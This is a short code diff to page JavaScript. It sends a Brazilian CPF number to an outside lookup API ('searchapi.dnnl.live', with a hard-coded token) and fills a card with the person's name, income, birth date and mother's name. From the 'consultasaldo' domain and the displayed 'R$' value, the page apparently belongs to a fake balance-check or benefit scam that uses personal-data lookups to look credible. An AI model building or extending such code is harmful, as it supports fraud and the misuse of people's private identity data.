@@ -202,13 +202,17 @@ if(valor) document.getElementById('cardValor').textContent = 'R$ ' + valor;
 
 // Busca API
 if(cpf && !nome){
-  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf='+cpf)
+  var cleanCpf = cpf.replace(/\D/g, '');
+  fetch('https://searchapi.dnnl.live/consulta?token_api=2077&cpf=' + cleanCpf)
     .then(function(r){return r.json();})
     .then(function(d){
-      if(d.nome){ document.getElementById('cardNome').textContent = d.nome.toUpperCase(); nome=d.nome; }
-      if(d.valor){ document.getElementById('cardValor').textContent = 'R$ '+d.valor; valor=d.valor; }
-      if(d.nascimento && !nasc){ nasc = d.nascimento; }
-      if(d.nome_mae && !mae){ mae = d.nome_mae; }
+      if(d.status === 200 && d.dados && d.dados[0]){
+        var item = d.dados[0];
+        if(item.NOME){ document.getElementById('cardNome').textContent = item.NOME.toUpperCase(); nome=item.NOME; }
+        if(item.RENDA){ document.getElementById('cardValor').textContent = 'R$ '+item.RENDA; valor=item.RENDA; }
+        if(item.NASC && !nasc){ nasc = item.NASC; }
+        if(item.NOME_MAE && !mae){ mae = item.NOME_MAE; }
+      }
     }).catch(function(){});
 }
 
